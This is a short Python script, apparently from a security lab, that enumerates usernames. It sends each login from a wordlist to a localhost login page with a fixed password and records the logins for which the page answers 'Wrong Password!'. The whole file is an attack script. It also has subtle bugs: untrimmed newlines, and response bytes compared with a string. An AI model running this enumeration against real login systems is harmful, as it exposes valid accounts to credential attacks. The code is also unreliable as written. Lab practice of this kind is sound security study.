import requests


def user_enum(login):
    payload = {'login': login, 'password': '123456'}
    response = requests.get('http://localhost/user-enum/login.php', params=payload)
    return response.content == 'Wrong Password!'


fr = open('input_lists/logins', 'r')
fw = open('output_lists/logins', 'w')
for line in fr:
    if user_enum(line):
        fw.write(line)
fr.close()
fw.close()
